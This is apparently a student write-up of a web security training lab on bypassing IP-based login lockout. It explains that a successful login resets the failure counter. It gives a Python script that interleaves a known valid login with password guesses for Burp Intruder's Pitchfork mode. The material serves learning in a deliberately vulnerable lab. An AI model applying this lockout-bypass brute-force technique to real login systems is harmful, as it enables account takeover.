## Lab description & Analysis

This lab implements brute-force protection by temporaily blocking the source IP after three consecutive failed login attempts. It was observed that this might appear to prevent credential stuffing because repeated incorrect submissions from a single client are rate-limited by lockout behavior but the flaw is in how this failure counter is managed.

A successful login for any account resets the failed-attempt counter tied to the client IP.

Instead of sending uninterrupted failures for `carlos`, our approach could involve attempting valid logins for `wiener` using the known credentials. Since each successful `wiener:peter` request clears failure state.

## Payload creation

> LOGIC

```text
carlos : pass_1
carlos : pass_2
wiener : peter      <-- reset event
carlos : pass_3
carlos : pass_4
wiener : peter      <-- reset event
...
```

We will be utilising the Burp Intruder for this lab with the Pitchfork mode, our position 1 (username) and position 2 (password) are iterated over row-by-row.

## Script used for the payload-list generation

I used the following python script, it prints two aligned payload streams for us.

- a _username_ stream where every third entry is `wiener`
- a _password_ stream where each `wiener` row is paired with the credential `peter` at every third interval.

```python
print("############## the following are the usernames: #################")

for i in range(150):
    if i % 3:
        print("carlos")
    else:
        print("wiener")


print("############### the following are the passwords: ####################")

with open('authentication_lab_passwords.txt', 'r') as f:
    lines = f.readlines()

i = 0
for pwd in lines:
    if i% 3:
        print(pwd.strip('\n'))
    else:
        print("peter")
        print(pwd.strip('\n'))
        i = i+1
    i = i+1
```
